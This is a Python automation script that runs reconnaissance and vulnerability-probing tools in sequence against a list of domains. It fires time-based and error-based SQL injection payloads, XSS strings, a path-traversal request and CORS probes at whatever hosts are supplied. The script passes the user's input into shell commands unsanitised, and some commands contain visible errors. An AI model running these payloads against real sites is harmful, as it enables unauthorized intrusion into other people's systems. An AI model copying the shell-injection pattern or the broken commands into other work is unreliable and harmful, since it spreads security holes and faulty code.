from termcolor import colored
import subprocess
import threading

file_lock = threading.Lock()

def run_command(command, output_file=None):
    result = subprocess.run(command, shell=True, text=True, capture_output=True)
    if output_file:
        with open(output_file, 'w') as file:
            file.write(result.stdout)
    return result.stdout

def get_user_input(prompt):
    user_input = input(prompt)
    while not user_input.strip():
        print(colored("Input cannot be empty. Please try again.", "red"))
        user_input = input(prompt)
    return user_input

def print_banner():
    banner = "\033[1;36m" + r"""
    ________    _______  ___________         .____    .___ _______  _____________________ 
    \_____  \   \      \ \_   _____/         |    |   |   |\      \ \_   _____/\______   \
    /    |   \  /   |   \ |    __)_   ______ |    |   |   |/   |   \ |    __)_  |       _/
    /    |    \/    |    \|        \ /_____/ |    |___|   /    |    \|        \ |    |   \
    \_______  /\____|__  /_______  /         |_______ \___\____|__  /_______  / |____|_  /
            \/         \/        \/                  \/           \/        \/         \/ 
    """
    print(banner)

def main():
    print_banner()

    domains_file = get_user_input("Please enter the name of the txt file containing the domain list: ")
    output_file = 'output.txt'
    all_results_file = 'all_results.txt'

    commands = [
        {'cmd': f'subfinder -dL {domains_file} -o subs.txt', 'type': 'Subdomain Scan'},
        {'cmd': f'cat subs.txt | waybackurls | grep "\\\\?" | uro | httpx -silent > parameters.txt', 'type': 'Parameters Extraction'},
        {'cmd': f'cat parameters.txt | httpx -threads 50 -silent -o parameters_http.txt && cat parameters_http.txt | grep ".php" | sed \'s/\.php.*/.php\\//\' | sort -u | sed s/$/%27%22%60/ | parallel -j50 "httpx -silent {{}} -ms \'You have an error in your SQL syntax\'"', 'type': 'SQL Injection Scan 2'},
        {'cmd': f'cat parameters.txt | httpx -silent -H "X-Forwarded-For: \'XOR(if (now()=sysdate(), sleep (13),0))OR" -rt -timeout 20 -mrt \'>13\' -o sql1.txt', 'type': 'SQL Injection Scan 3'},
        {'cmd': f'cat subs.txt | httpx -silent -o public.txt && cat public.txt | grep -E "/api/index.php/v1/config/application?public=true" | httpx -silent -mc 200', 'type': 'HTTP API Check'},
        {'cmd': f'httpx -l subs.txt -path "/assets/built%2F..%2F..%2F/package.json" -status-code -mc 200 -o lfi.txt', 'type': 'LFI Check'},
        {'cmd': f'cat subs.txt | httpx -silent | waybackurls | gau | bxss -payload \'<script src=https://google.com ></script>\' -header "X-Forwarder-For"', 'type': 'Blind XSS Check'},
        {'cmd': f'cat parameters.txt | httpx -silent -H "X-Forwarded-For: \'1;SELECT IF((8303>8302),SLEEP(9),2356)#" -rt -timeout 20 -mrt \'>13\' -o sql2.txt', 'type': 'SQL Injection Scan 4'},
        {'cmd': f'cat parameters.txt | httpx -silent -H "X-Forwarded-For: \';%20waitfor%20delay%20\'0:0:6\'%20--%20" -rt -timeout 20 -mrt \'>13\' -o sql3.txt', 'type': 'SQL Injection Scan 5'},
        {'cmd': f'cat parameters.txt | grep -v -e js -e css -e svg -e png -e jpg -e eot -e ttf -e woff | httpx -mc 200 -silent > parameters_http.txt && cat parameters_http.txt | parallel -j50 "httpx --silent -H \"X-Forwarded-For: \'XOR(if (now()=sysdate(), sleep (13),0))OR\" -rt -timeout 20 -mrt \'>13\' -o sql4.txt"', 'type': 'SQL Injection Scan 6'},
        {'cmd': f'httpx -l parameters.txt -silent -no-color -threads 300 -location 301,302 | awk \'{{print $2}}\' | grep -Eo "(http|https)://[^/\"]*" | tr -d \'[]\' | parallel -j50 "gospider -d 0 -s {{}}" | tr \' \' \'\\n\' | grep -Eo \'(http|https)://[^/\"]*\' | grep "=" | qsreplace "<svg onload=alert(1)>";', 'type': 'XSS Check'},
        {'cmd': f'cat parameters.txt| grep "=" | qsreplace "1 AND (SELECT 5230 FROM (SELECT(SLEEP(10)))SUmc)"> blindsqli.txt', 'type': 'Blind SQL Injection Scan'},
        {'cmd': f'cat blindsqli.txt| parallel -j50 -q curl -o /dev/null -s -w %{{6}}\\n', 'type': 'Blind SQL Injection Scan 2'},
        {'cmd': f'nuclei -l parameters.txt -t fuzzing-templates -o FUZZReport.txt', 'type': 'Fuzzing Check'},
        {'cmd': f'cat subs.txt | httpx -threads 50 -silent -o httpx_results.txt', 'type': 'HTTP Scan 2'},
        {'cmd': f'cat httpx_results.txt | nuclei -t nuclei-templates -o WebReport.txt', 'type': 'Web Check'},
        {'cmd': f'cat {domains_file} | while read url; do target=$(curl -s -I -H "Origin: https://google.com" -X GET "$url"); if echo "$target" | grep -q \'https://google.com\'; then echo "[Potential CORS Found] $url" >> cors_check_results.txt; else echo "Nothing on $url" >> cors_check_results.txt; fi; done', 'type': 'CORS Check'},
        {'cmd': f'gospider -S httpx_results.txt -c 10 -d 5 --blacklist ".(jpg|jpeg|gif|css|tif|tiff|png|ttf|woff|woff2|ico|pdf|svg|txt)" --other-source | grep -e "code-200" | awk \'{{print $5}}\' | grep "=" | qsreplace -a | dalfox pipe | tee result.txt', 'type': 'Gospider Check'},
    ]

    print(colored("\nInitiating various security checks...\n", "yellow"))

    with open(all_results_file, 'w') as result_file:
        for command in commands:
            cmd = command['cmd']
            scan_type = command['type']
            result = run_command(cmd, output_file)
            result_file.write(f"\nResult for {scan_type}:\n" + "=" * 50 + '\n')
            result_file.write(result + '\n')
            print(f"Command output for {scan_type} scan has been saved to {output_file} file and 'all_results.txt' file.")

    print(colored("\nAll processes have been completed. Results have been saved to 'all_results.txt'.", "green"))

if __name__ == "__main__":
    main()

